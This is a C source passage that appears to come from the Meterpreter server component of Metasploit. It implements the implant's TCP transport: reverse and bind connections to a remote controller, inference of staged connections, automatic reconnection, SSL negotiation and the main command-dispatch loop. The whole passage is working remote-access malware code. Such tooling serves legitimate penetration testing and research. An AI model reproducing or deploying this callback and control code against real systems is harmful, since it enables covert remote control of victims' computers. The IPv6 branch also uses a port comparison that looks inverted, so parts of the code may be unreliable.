		if (getsockname(listenSocket, (struct sockaddr*)&listenStorage, &listenStorageSize) == SOCKET_ERROR)
		{
			vdprintf("[STAGED] Socket fd %u invalid: %u %x", listenSocket, GetLastError(), GetLastError());
			continue;
		}

		// on finding a socket, see if it matches the family of our current socket
		if (listenStorage.ss_family != ctx->sock_desc.ss_family)
		{
			vdprintf("[STAGED] Socket fd %u isn't the right family, it's %u", listenSocket, listenStorage.ss_family);
			continue;
		}

		// if it's the same, and we are on the same local port, we can assume that there's a bind listener
		if (listenStorage.ss_family == AF_INET)
		{
			if (((struct sockaddr_in*)&listenStorage)->sin_port == ((struct sockaddr_in*)&ctx->sock_desc)->sin_port)
			{
				dprintf("[STAGED] Connection appears to be an IPv4 bind connection on port %u", ntohs(((struct sockaddr_in*)&listenStorage)->sin_port));
				ctx->bound = TRUE;
				break;
			}
			vdprintf("[STAGED] Socket fd %u isn't listening on the same port", listenSocket);
		}
		else if (listenStorage.ss_family == AF_INET6)
		{
			if (((struct sockaddr_in6*)&listenStorage)->sin6_port != ((struct sockaddr_in6*)&ctx->sock_desc)->sin6_port)
			{
				dprintf("[STAGED] Connection appears to be an IPv6 bind connection on port %u", ntohs(((struct sockaddr_in6*)&listenStorage)->sin6_port));
				ctx->bound = TRUE;
				break;
			}
			vdprintf("[STAGED] Socket fd %u isn't listening on the same port", listenSocket);
		}
	}

	if (ctx->bound)
	{
		// store the details of the listen socket so that we can use it again
		ctx->sock_desc_size = sizeof(ctx->sock_desc);
		getsockname(listenSocket, (struct sockaddr*)&ctx->sock_desc, &ctx->sock_desc_size);

		// the listen socket that we have been given needs to be tidied up because
		// the stager doesn't do it
		closesocket(listenSocket);
	}
	else
	{
		// if we get here, we assume reverse_tcp, and so we need the peername data to connect back to
		vdprintf("[STAGED] Connection appears to be a reverse connection");
		ctx->sock_desc_size = sizeof(ctx->sock_desc);
		getpeername(ctx->fd, (struct sockaddr*)&ctx->sock_desc, &ctx->sock_desc_size);
#ifdef DEBUGTRACE
		if (ctx->sock_desc.ss_family == AF_INET)
		{
			dprintf("[STAGED] sock name: size %u, family %u, port %u", ctx->sock_desc_size, ctx->sock_desc.ss_family, ntohs(((struct sockaddr_in*)&ctx->sock_desc)->sin_port));
		}
		else
		{
			dprintf("[STAGED] sock name: size %u, family %u, port %u", ctx->sock_desc_size, ctx->sock_desc.ss_family, ntohs(((struct sockaddr_in6*)&ctx->sock_desc)->sin6_port));
		}
#endif
	}
}

/*!
 * @brief Configure the TCP connnection. If it doesn't exist, go ahead and estbalish it.
 * @param remote Pointer to the remote instance with the TCP transport details wired in.
 * @param sock Reference to the original socket FD passed to metsrv.
 * @return Indication of success or failure.
 */
static BOOL configure_tcp_connection(Remote* remote, SOCKET sock)
{
	DWORD result = ERROR_SUCCESS;
	size_t charsConverted;
	TcpTransportContext* ctx = (TcpTransportContext*)remote->transport->ctx;
	char* asciiUrl = remote->transport->url;

	remote->transport->start_time = current_unix_timestamp();
	remote->transport->comms_last_packet = current_unix_timestamp();

	if (strncmp(asciiUrl, "tcp", 3) == 0)
	{
		const int iRetryAttempts = 30;
		char* pHost = strstr(asciiUrl, "//") + 2;
		char* pPort = strrchr(pHost, ':') + 1;

		// check if we're using IPv6
		if (asciiUrl[3] == '6')
		{
			char* pScopeId = strrchr(pHost, '?') + 1;
			*(pScopeId - 1) = '\0';
			*(pPort - 1) = '\0';
			dprintf("[STAGELESS] IPv6 host %s port %S scopeid %S", pHost, pPort, pScopeId);
			result = reverse_tcp6(pHost, pPort, atol(pScopeId), remote->transport->timeouts.retry_total,
				remote->transport->timeouts.retry_wait, remote->transport->expiration_end, &ctx->fd);
		}
		else
		{
			u_short usPort = (u_short)atoi(pPort);

			// if no host is specified, then we can assume that this is a bind payload, otherwise
			// we'll assume that the payload is a reverse_tcp one and the given host is valid
			if (*pHost == ':')
			{
				dprintf("[STAGELESS] IPv4 bind port %s", pPort);
				result = bind_tcp(usPort, &ctx->fd);
			}
			else
			{
				*(pPort - 1) = '\0';
				dprintf("[STAGELESS] IPv4 host %s port %s", pHost, pPort);
				result = reverse_tcp4(pHost, usPort, remote->transport->timeouts.retry_total, remote->transport->timeouts.retry_wait,
					remote->transport->expiration_end, &ctx->fd);
			}
		}
	}
	else if (ctx->sock_desc_size > 0)
	{
		dprintf("[STAGED] Attempted to reconnect based on inference from previous staged connection (size %u)", ctx->sock_desc_size);

		// check if we should do bind() or reverse()
		if (ctx->bound)
		{
			dprintf("[STAGED] previous connection was a bind connection");
			SOCKET listenSocket = socket(ctx->sock_desc.ss_family, SOCK_STREAM, IPPROTO_TCP);

			result = bind_tcp_run(listenSocket, (struct sockaddr*)&ctx->sock_desc, ctx->sock_desc_size, &ctx->fd);
		}
		else
		{
			dprintf("[STAGED] previous connection was a reverse connection");
			ctx->fd = socket(ctx->sock_desc.ss_family, SOCK_STREAM, IPPROTO_TCP);

			result = reverse_tcp_run(ctx->fd, (struct sockaddr*)&ctx->sock_desc, ctx->sock_desc_size,
				remote->transport->timeouts.retry_total, remote->transport->timeouts.retry_wait,
				remote->transport->expiration_end);

			if (result != ERROR_SUCCESS)
			{
				ctx->fd = 0;
			}
		}
	}
	else
	{
		// if we get here it means that we've been given a socket from the stager. So we need to stash
		// that in our context. Once we've done that, we need to attempt to infer whether this conn
		// was created via reverse or bind, so that we can do the same thing later on if the transport
		// fails for some reason.
		infer_staged_connection_type(ctx, sock);
	}

	if (result != ERROR_SUCCESS) {
		return FALSE;
	}
	// Do not allow the file descriptor to be inherited by child processes
	SetHandleInformation((HANDLE)ctx->fd, HANDLE_FLAG_INHERIT, 0);

	dprintf("[SERVER] Flushing the socket handle...");
	server_socket_flush(remote);

	// TODO: remove this when stageless stuff happens.
	// if we've just "reconnected" then we're going to flush
	// the socket a second time beacuse the second stage is
	// coming down and we don't want it!
	if (ctx->sock_desc_size > 0)
	{
		server_socket_flush(remote);
	}

	dprintf("[SERVER] Initializing SSL...");
	if (server_initialize_ssl(remote))
	{
		dprintf("[SERVER] SSL failed to initialize");
		return FALSE;
	}

	dprintf("[SERVER] Negotiating SSL...");
	if (!server_negotiate_ssl(remote))
	{
		dprintf("[SERVER] Failed to negotiate SSL");
		return FALSE;
	}

	return TRUE;
}

/*!
 * @brief Get the socket from the transport (if it's TCP).
 * @param transport Pointer to the TCP transport containing the socket.
 * @return The current transport socket FD, if any, or zero.
 */
static SOCKET transport_get_socket_tcp(Transport* transport)
{
	if (transport && transport->type == METERPRETER_TRANSPORT_SSL)
	{
		return ((TcpTransportContext*)transport->ctx)->fd;
	}

	return 0;
}

/*!
 * @brief Creates a new TCP transport instance.
 * @param url URL containing the transport details.
 * @param timeouts The timeout values to use for this transport.
 * @return Pointer to the newly configured/created TCP transport instance.
 */
Transport* transport_create_tcp(char* url, TimeoutSettings* timeouts)
{
	Transport* transport = (Transport*)malloc(sizeof(Transport));
	TcpTransportContext* ctx = (TcpTransportContext*)malloc(sizeof(TcpTransportContext));

	dprintf("[TRANS TCP] Creating tcp transport for url %S", url);

	memset(transport, 0, sizeof(Transport));
	memset(ctx, 0, sizeof(TcpTransportContext));

	memcpy(&transport->timeouts, timeouts, sizeof(transport->timeouts));

	transport->type = METERPRETER_TRANSPORT_SSL;
	transport->url = strdup(url);
	transport->packet_transmit = packet_transmit_via_ssl;
	transport->transport_init = configure_tcp_connection;
	transport->transport_deinit = server_destroy_ssl;
	transport->transport_destroy = transport_destroy_tcp;
	transport->transport_reset = transport_reset_tcp;
	transport->server_dispatch = server_dispatch_tcp;
	transport->get_socket = transport_get_socket_tcp;
	transport->ctx = ctx;
	transport->expiration_end = current_unix_timestamp() + transport->timeouts.expiry;
	transport->start_time = current_unix_timestamp();
	transport->comms_last_packet = current_unix_timestamp();

	return transport;
}

/*!
 * @brief Create a new transport based on the given metsrv configuration.
 * @param config Pointer to the metsrv configuration block.
 * @param stageless Indication of whether the configuration is stageless.
 * @param fd The socket descriptor passed to metsrv during intialisation.
 */
static Transport* transport_create(MetsrvConfigData* config, BOOL stageless)
{
	Transport* t = NULL;
	char* transport = config->transport + TRANSPORT_ID_OFFSET;
	char* url = config->url + (stageless ? 1 : 0);

	dprintf("[TRANSPORT] Type = %s", transport);
	dprintf("[TRANSPORT] URL = %s", url);

	if (strcmp(transport, "SSL") == 0)
	{
		t = transport_create_tcp(url, &config->timeouts.values);
	}
	else
	{
		// one day we'll have http(s)
	}

	if (t) {
		dprintf("[TRANSPORT] Comms timeout: %u %08x", t->timeouts.comms, t->timeouts.comms);
		dprintf("[TRANSPORT] Session timeout: %u %08x", t->timeouts.expiry, t->timeouts.expiry);
		dprintf("[TRANSPORT] Session expires: %u %08x", t->expiration_end, t->expiration_end);
		dprintf("[TRANSPORT] Retry total: %u %08x", t->timeouts.retry_total, t->timeouts.retry_total);
		dprintf("[TRANSPORT] Retry wait: %u %08x", t->timeouts.retry_wait, t->timeouts.retry_wait);
	}

	return t;
}

/*!
 * @brief Setup and run the server. This is called from Init via the loader.
 * @param fd The original socket descriptor passed in from the stager, or a pointer to stageless extensions.
 * @return Meterpreter exit code (ignored by the caller).
 */
DWORD server_setup(SOCKET fd)
{
	THREAD * dispatchThread = NULL;
	Remote *remote = NULL;
	char cStationName[256] = { 0 };
	char cDesktopName[256] = { 0 };
	DWORD res = 0;

	dprintf("[SERVER] Initializing...");
	int local_error = 0;

	srand(time(NULL));

	printf("[SERVER] module loaded at 0x%08X", hAppInstance);

	// Open a THREAD item for the servers main thread, we use this to manage migration later.
	dispatchThread = thread_open();
	dprintf("[SERVER] main server thread: handle=0x%08X id=0x%08X sigterm=0x%08X",
		dispatchThread->handle, dispatchThread->id, dispatchThread->sigterm);

	if (!(remote = remote_allocate())) {
		SetLastError(ERROR_NOT_ENOUGH_MEMORY);
		goto out;
	}

	// Set up the transport creation function pointers.
	remote->trans_create_tcp = transport_create_tcp;

	// Store our thread handle
	remote->server_thread = dispatchThread->handle;

	dprintf("[SERVER] Registering dispatch routines...");
	register_dispatch_routines();

	// allocate the "next transport" information
	dprintf("[SERVER] creating transport");
	remote->next_transport = transport_create(&global_config, FALSE);

	while (remote->next_transport)
	{
		// Work off the next transport
		remote->transport = remote->next_transport;

		if (remote->transport->transport_init)
		{
			dprintf("[SERVER] attempting to initialise transport 0x%p", remote->transport->transport_init);
			// Each transport has its own set of retry settings and each should honour
			// them individually.
			if (!remote->transport->transport_init(remote, fd))
			{
				dprintf("[SERVER] transport initialisation failed.");

				// when we have a list of transports, we'll iterate to the next one.
				break;
			}
		}

		// once initialised, we'll clean up the next transport so that we don't try again
		remote->next_transport = NULL;

		dprintf("[SERVER] Entering the main server dispatch loop for transport %x, context %x", remote->transport, remote->transport->ctx);
		DWORD dispatchResult = remote->transport->server_dispatch(remote, dispatchThread);

		if (remote->transport->transport_deinit)
		{
			remote->transport->transport_deinit(remote);
		}

		// If the transport mechanism failed, then we should loop until we're able to connect back again.
		// But if it was successful, and this is a valid exit, then we should clean up and leave.
		if (dispatchResult == ERROR_SUCCESS)
		{
			remote->transport->transport_destroy(remote);
		}
		else
		{
			// try again!
			if (remote->transport->transport_reset)
			{
				remote->transport->transport_reset(remote->transport);
			}

			// when we have a list of transports, we'll iterate to the next one (perhaps?)
			remote->next_transport = remote->transport;
		}
	}

	dprintf("[SERVER] Deregistering dispatch routines...");
	deregister_dispatch_routines(remote);

	remote_deallocate(remote);

out:
	res = GetLastError();

	dprintf("[SERVER] Finished.");
	return res == ERROR_SUCCESS;
}
